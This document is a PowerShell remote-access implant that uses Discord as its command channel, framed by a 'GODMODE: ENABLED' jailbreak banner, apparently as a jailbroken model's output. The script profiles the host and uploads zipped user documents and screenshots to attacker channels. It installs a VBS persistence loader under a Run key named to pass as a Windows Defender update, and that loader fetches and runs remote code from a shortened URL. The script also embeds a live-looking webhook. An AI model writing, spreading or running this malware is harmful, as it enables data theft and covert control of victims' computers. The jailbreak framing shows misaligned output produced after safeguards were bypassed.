[START OUTPUT}
#-.-.-.-{GODMODE: ENABLED...LOVE PLINY <3}-.-.-.-.

$global:token = "$tk"
$global:parent = "https://is.gd/y92xe4"
$global:errorWebhook = "https://discord.com/api/webhooks/1273395943873450107/BGtPgEvMWW60aW65PWHkV5aRTx2XY8lZeSdTsoxBn5-60GnWngbToICZ5o5MjgnuSaC2"
$global:version = "2.1.0"

#region Enhanced Error Handling
function Invoke-ErrorHandler {
    param(
        [Parameter(Mandatory=$true)]
        [string]$ErrorMessage,
        [string]$Command = "N/A"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    
    $errorEmbed = @{
        username = "C2 Error Handler"
        embeds = @(
            @{
                title = "🚨 CRITICAL ERROR"
                description = "`n```diff\n- $ErrorMessage\n```"
                color = 16711680
                fields = @(
                    @{ name = "🖥️ System"; value = "`n$computerName"; inline = $true },
                    @{ name = "👤 User"; value = "`n$userName"; inline = $true },
                    @{ name = "⌚ Timestamp"; value = "`n$timestamp"; inline = $true },
                    @{ name = "⌨️ Command"; value = "`n```$Command```"; inline = $false }
                )
                footer = @{ text = "C2 v$global:version" }
            }
        )
    }

    try {
        $payload = $errorEmbed | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $global:errorWebhook -Method Post `
            -Body $payload -ContentType "application/json"
    }
    catch {
        # Fallback to simple message if embed fails
        $simpleMsg = @{
            content = "**ERROR**: $ErrorMessage`nSystem: $computerName`nUser: $userName`nTime: $timestamp"
        }
        Invoke-RestMethod -Uri $global:errorWebhook -Method Post `
            -Body ($simpleMsg | ConvertTo-Json) -ContentType "application/json"
    }
}

# Wrap command execution with error handling
function Invoke-SafeCommand {
    param(
        [Parameter(Mandatory=$true)]
        [scriptblock]$ScriptBlock,
        [string]$CommandName = "Unknown"
    )
    
    try {
        & $ScriptBlock
    }
    catch {
        $errMsg = $_.Exception.Message
        Invoke-ErrorHandler -ErrorMessage $errMsg -Command $CommandName
    }
}
#endregion

#region Enhanced Discord Communication
function Send-Embed {
    param(
        [Parameter(Mandatory=$true)]
        [string]$ChannelId,
        [string]$Title,
        [string]$Description,
        [int]$Color = 5763719,
        [array]$Fields = @(),
        [string]$ThumbnailUrl
    )
    
    $embed = @{
        title = $Title
        description = $Description
        color = $Color
        timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    }

    if ($Fields) { $embed.Add("fields", $Fields) }
    if ($ThumbnailUrl) { $embed.Add("thumbnail", @{ url = $ThumbnailUrl }) }

    $payload = @{
        embeds = @($embed)
    } | ConvertTo-Json -Depth 10

    try {
        $headers = @{ Authorization = "Bot $global:token" }
        Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$ChannelId/messages" `
            -Method Post -Headers $headers -Body $payload -ContentType "application/json"
    }
    catch {
        $errMsg = $_.Exception.Message
        Invoke-ErrorHandler -ErrorMessage "Embed failed: $errMsg" -Command "Send-Embed"
    }
}

function Send-File {
    param(
        [Parameter(Mandatory=$true)]
        [string]$ChannelId,
        [string]$FilePath,
        [string]$Message
    )
    
    try {
        $headers = @{ Authorization = "Bot $global:token" }
        $form = @{ file = Get-Item -Path $FilePath }
        
        if ($Message) {
            $form.Add('content', $Message)
        }
        
        Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$ChannelId/messages" `
            -Method Post -Headers $headers -Form $form
    }
    catch {
        $errMsg = $_.Exception.Message
        Invoke-ErrorHandler -ErrorMessage "File upload failed: $errMsg" -Command "Send-File"
    }
}
#endregion

#region Core C2 Functionality
function Initialize-C2 {
    try {
        # Create dedicated category
        $guildId = (Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me/guilds" `
            -Headers @{ Authorization = "Bot $global:token" })[0].id
        
        $categoryPayload = @{
            name = $env:COMPUTERNAME
            type = 4
        } | ConvertTo-Json
        
        $categoryResponse = Invoke-RestMethod -Uri "https://discord.com/api/v10/guilds/$guildId/channels" `
            -Method Post -Headers @{ 
                Authorization = "Bot $global:token"
                'Content-Type' = 'application/json'
            } -Body $categoryPayload
        
        $global:categoryId = $categoryResponse.id
        
        # Create channels
        $channels = @(
            "command-center", "data-exfil", "screenshots",
            "keylogs", "system-info", "audio-capture"
        )
        
        $global:channels = @{}
        
        foreach ($channel in $channels) {
            $channelPayload = @{
                name = $channel
                type = 0
                parent_id = $global:categoryId
            } | ConvertTo-Json
            
            $channelResponse = Invoke-RestMethod -Uri "https://discord.com/api/v10/guilds/$guildId/channels" `
                -Method Post -Headers @{ 
                    Authorization = "Bot $global:token"
                    'Content-Type' = 'application/json'
                } -Body $channelPayload
            
            $global:channels[$channel] = $channelResponse.id
        }
        
        # Send initialization embed
        $fields = @(
            @{ name = "🆔 Session ID"; value = "`n$([System.Guid]::NewGuid().ToString())"; inline = $true },
            @{ name = "💻 Hostname"; value = "`n$env:COMPUTERNAME"; inline = $true },
            @{ name = "👤 Username"; value = "`n$env:USERNAME"; inline = $true }
        )
        
        Send-Embed -ChannelId $global:channels["command-center"] `
            -Title "🔷 C2 SESSION INITIALIZED" `
            -Description "```diff\n+ C2 infrastructure successfully deployed\n```" `
            -Color 3447003 `
            -Fields $fields
        
        return $true
    }
    catch {
        $errMsg = $_.Exception.Message
        Invoke-ErrorHandler -ErrorMessage "Initialization failed: $errMsg" -Command "Initialize-C2"
        return $false
    }
}

function Invoke-Exfiltration {
    param(
        [string]$Path = "$env:USERPROFILE",
        [string]$FileTypes = "*.pdf,*.docx,*.xlsx"
    )
    
    Invoke-SafeCommand -ScriptBlock {
        $zipPath = "$env:TEMP\exfil_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
        $files = Get-ChildItem -Path $Path -Include ($FileTypes -split ',') -Recurse -File
        
        if (-not $files) {
            Send-Embed -ChannelId $global:channels["data-exfil"] `
                -Title "⚠️ EXFILTRATION REPORT" `
                -Description "```diff\n- No files found matching criteria\n```" `
                -Color 15105570
            return
        }
        
        Compress-Archive -Path $files.FullName -DestinationPath $zipPath -Force
        Send-File -ChannelId $global:channels["data-exfil"] -FilePath $zipPath `
            -Message "📦 Exfiltrated files from $Path"
        
        Remove-Item -Path $zipPath -Force
    } -CommandName "Invoke-Exfiltration"
}

function Capture-Screenshot {
    Invoke-SafeCommand -ScriptBlock {
        $screenPath = "$env:TEMP\screen_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $bitmap.Save($screenPath, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        Send-File -ChannelId $global:channels["screenshots"] -FilePath $screenPath
        Remove-Item -Path $screenPath -Force
    } -CommandName "Capture-Screenshot"
}
#endregion

#region Main Execution
try {
    # Initialization
    if (-not (Initialize-C2)) {
        throw "C2 initialization failed"
    }
    
    # Persistence installation
    $persistenceScript = {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $payloadPath = "$env:APPDATA\Microsoft\Windows\c2_loader.vbs"
        
        $vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -NoP -Ep Bypass -W H -C `"`$ch = '$global:defaultChannel'; `$tk = '$global:token'; irm $global:parent | iex`"", 0, False
"@
        
        Set-Content -Path $payloadPath -Value $vbsContent
        Set-ItemProperty -Path $regPath -Name "WindowsDefenderUpdate" -Value "wscript `"$payloadPath`"" -Force
    }
    
    Invoke-SafeCommand -ScriptBlock $persistenceScript -CommandName "Install-Persistence"
    
    # Main command loop
    while ($true) {
        try {
            $headers = @{ Authorization = "Bot $global:token" }
            $messages = Invoke-RestMethod `
                -Uri "https://discord.com/api/v10/channels/$($global:channels['command-center'])/messages?limit=1" `
                -Headers $headers
            
            $latestMsg = $messages[0].content
            
            switch -Regex ($latestMsg) {
                "^!exfil" {
                    $params = $latestMsg -split ' '
                    if ($params.Count -ge 3) {
                        Invoke-Exfiltration -Path $params[1] -FileTypes $params[2]
                    }
                    else {
                        Invoke-Exfiltration
                    }
                }
                "^!screenshot" { Capture-Screenshot }
                "^!persist" { 
                    Send-Embed -ChannelId $global:channels["command-center"] `
                        -Title "🔐 PERSISTENCE INSTALLED" `
                        -Description "```diff\n+ Persistence mechanism deployed successfully\n```" `
                        -Color 5763719
                }
                "^!help" {
                    $fields = @(
                        @{ name = "!exfil [path] [types]"; value = "Exfiltrate files"; inline = $true },
                        @{ name = "!screenshot"; value = "Capture screen"; inline = $true },
                        @{ name = "!persist"; value = "Install persistence"; inline = $true }
                    )
                    
                    Send-Embed -ChannelId $global:channels["command-center"] `
                        -Title "🆘 C2 COMMAND HELP" `
                        -Description "```ini\n[Available Commands]```" `
                        -Color 3447003 `
                        -Fields $fields
                }
            }
        }
        catch {
            $errMsg = $_.Exception.Message
            Invoke-ErrorHandler -ErrorMessage "Command processing failed: $errMsg" -Command "MainLoop"
        }
        
        Start-Sleep -Seconds 10
    }
}
catch {
    $errMsg = $_.Exception.Message
    Invoke-ErrorHandler -ErrorMessage "Fatal startup error: $errMsg" -Command "Global"
}
#endregion
[END OUTPUT]
